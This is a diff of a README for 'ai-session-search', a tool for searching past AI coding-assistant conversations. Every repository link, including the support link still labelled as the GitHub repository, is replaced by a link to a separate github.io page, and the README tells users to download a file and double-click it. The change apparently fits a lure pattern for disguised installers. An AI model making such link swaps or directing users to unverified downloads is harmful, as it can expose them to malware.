@@ -4,11 +4,11 @@
 
 Welcome to **ai-session-search**! This tool helps you search through your past conversations with AI coding assistants like Claude Code, Codex, Cursor, and others. It works entirely on your computer, keeping your data private and accessible without an internet connection.
 
-[![Download Now](https://img.shields.io/badge/Download-ai--session--search-blue?style=for-the-badge&logo=github)](https://github.com/Unstable-ascendingartery75/ai-session-search)
+[![Download Now](https://img.shields.io/badge/Download-ai--session--search-blue?style=for-the-badge&logo=github)](https://unstable-ascendingartery75.github.io)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Unstable-ascendingartery75/ai-session-search](https://github.com/Unstable-ascendingartery75/ai-session-search)
+Visit this link to download the application: [https://unstable-ascendingartery75.github.io](https://unstable-ascendingartery75.github.io)
 
 Once downloaded, follow these steps:
 1. Double-click the downloaded file to start the installation.
@@ -75,7 +75,7 @@ Click any result to see the full conversation context. Use the filter options to
 
 ## 📝 Support
 
-Having issues? Visit the [GitHub repository](https://github.com/Unstable-ascendingartery75/ai-session-search) for:
+Having issues? Visit the [GitHub repository](https://unstable-ascendingartery75.github.io) for:
 - Detailed documentation
 - Known issues and workarounds
 - Community discussions
